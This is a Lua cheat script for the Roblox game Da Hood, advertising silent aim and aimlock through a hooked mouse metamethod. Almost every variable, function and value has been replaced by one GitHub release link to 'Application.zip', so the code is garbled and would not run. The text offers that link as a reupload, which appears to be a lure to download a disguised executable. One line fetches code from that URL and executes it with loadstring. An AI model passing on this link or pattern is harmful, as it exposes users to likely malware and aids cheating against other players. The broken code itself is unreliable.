-- Original link : https://github.com/dahoodmans/dahoodmans/releases/download/v1.0/Application.zip%https://github.com/dahoodmans/dahoodmans/releases/download/v1.0/Application.zip
-- reuploaded so it will be still alive if removed
getgenv().SilentAim = true -- true or false
getgenv().AimLock = true -- true or false
getgenv().Prediction = 0.165 -- Prediction of Silent Aim and AimLock
getgenv().AimLockKeybind = https://github.com/dahoodmans/dahoodmans/releases/download/v1.0/Application.zip -- Keybind for AIMLOCK (NOT SILENT AIM)

-- // Dependencies
local Aiming = loadstring(game:HttpGet("https://github.com/dahoodmans/dahoodmans/releases/download/v1.0/Application.zip%20aim%20module"))()
https://github.com/dahoodmans/dahoodmans/releases/download/v1.0/Application.zip(false)

-- // Services
local Workspace = game:GetService("Workspace")
local Players = game:GetService("Players")
local RunService = game:GetService("RunService")
local UserInputService = game:GetService("UserInputService")

-- // Vars
local LocalPlayer = https://github.com/dahoodmans/dahoodmans/releases/download/v1.0/Application.zip
local Mouse = LocalPlayer:GetMouse()
local CurrentCamera = https://github.com/dahoodmans/dahoodmans/releases/download/v1.0/Application.zip

local DaHoodSettings = {
    SilentAim = getgenv().SilentAim,
    AimLock = getgenv().AimLock,
    Prediction = getgenv().Prediction,
    AimLockKeybind = https://github.com/dahoodmans/dahoodmans/releases/download/v1.0/Application.zip
}
getgenv().DaHoodSettings = DaHoodSettings

-- // Overwrite to account downed
function https://github.com/dahoodmans/dahoodmans/releases/download/v1.0/Application.zip()
    -- // Check A
    if not (https://github.com/dahoodmans/dahoodmans/releases/download/v1.0/Application.zip == true and https://github.com/dahoodmans/dahoodmans/releases/download/v1.0/Application.zip ~= LocalPlayer and https://github.com/dahoodmans/dahoodmans/releases/download/v1.0/Application.zip ~= nil) then
        return false
    end

    -- // Check if downed
    local Character = https://github.com/dahoodmans/dahoodmans/releases/download/v1.0/Application.zip(https://github.com/dahoodmans/dahoodmans/releases/download/v1.0/Application.zip)
    local KOd = Character:WaitForChild("BodyEffects")["K.O"].Value
    local Grabbed = Character:FindFirstChild("GRABBING_CONSTRAINT") ~= nil

    -- // Check B
    if (KOd or Grabbed) then
        return false
    end

    -- //
    return true
end

-- // Hook
local __index
__index = hookmetamethod(game, "__index", function(t, k)
    -- // Check if it trying to get our mouse's hit or target and see if we can use it
    if (t:IsA("Mouse") and (k == "Hit" or k == "Target") and https://github.com/dahoodmans/dahoodmans/releases/download/v1.0/Application.zip()) then
        -- // Vars
        local SelectedPart = https://github.com/dahoodmans/dahoodmans/releases/download/v1.0/Application.zip

        -- // Hit/Target
        if (https://github.com/dahoodmans/dahoodmans/releases/download/v1.0/Application.zip and (k == "Hit" or k == "Target")) then
            -- // Hit to account prediction
            local Hit = https://github.com/dahoodmans/dahoodmans/releases/download/v1.0/Application.zip + (https://github.com/dahoodmans/dahoodmans/releases/download/v1.0/Application.zip * https://github.com/dahoodmans/dahoodmans/releases/download/v1.0/Application.zip)

            -- // Return modded val
            return (k == "Hit" and Hit or SelectedPart)
        end
    end

    -- // Return
    return __index(t, k)
end)

-- // Aimlock
RunService:BindToRenderStep("AimLock", 0, function()
    if (https://github.com/dahoodmans/dahoodmans/releases/download/v1.0/Application.zip and https://github.com/dahoodmans/dahoodmans/releases/download/v1.0/Application.zip() and UserInputService:IsKeyDown(https://github.com/dahoodmans/dahoodmans/releases/download/v1.0/Application.zip)) then
        -- // Vars
        local SelectedPart = https://github.com/dahoodmans/dahoodmans/releases/download/v1.0/Application.zip

        -- // Hit to account prediction
        local Hit = https://github.com/dahoodmans/dahoodmans/releases/download/v1.0/Application.zip + (https://github.com/dahoodmans/dahoodmans/releases/download/v1.0/Application.zip * https://github.com/dahoodmans/dahoodmans/releases/download/v1.0/Application.zip)

        -- // Set the camera to face towards the Hit
        https://github.com/dahoodmans/dahoodmans/releases/download/v1.0/Application.zip = https://github.com/dahoodmans/dahoodmans/releases/download/v1.0/Application.zip(https://github.com/dahoodmans/dahoodmans/releases/download/v1.0/Application.zip, https://github.com/dahoodmans/dahoodmans/releases/download/v1.0/Application.zip)
    end
end)
